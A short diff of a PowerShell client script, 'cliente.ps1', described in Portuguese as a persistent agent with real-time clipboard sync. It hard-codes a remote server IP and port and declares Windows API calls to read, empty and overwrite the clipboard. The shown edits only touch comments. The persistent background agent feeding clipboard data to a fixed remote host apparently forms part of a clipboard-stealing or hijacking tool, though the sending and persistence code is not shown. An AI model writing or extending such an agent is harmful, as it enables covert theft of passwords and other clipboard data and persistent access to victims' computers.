@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# Agent + Persistencia + Clipboard Sync em tempo real
+# Agent + Persistencia + Clipboard Sync em tempo real (CORRIGIDO)
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -155,7 +155,7 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll", SetLastError = true)] public static extern bool OpenClipboard(IntPtr hWnd);
         [DllImport("user32.dll", SetLastError = true)] public static extern bool CloseClipboard();
         [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr GetClipboardData(uint uFormat);
-        [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem); // CORRIGIDO AQUI
+        [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
         [DllImport("user32.dll", SetLastError = true)] public static extern bool EmptyClipboard();
         [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);
         [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalLock(IntPtr hMem);
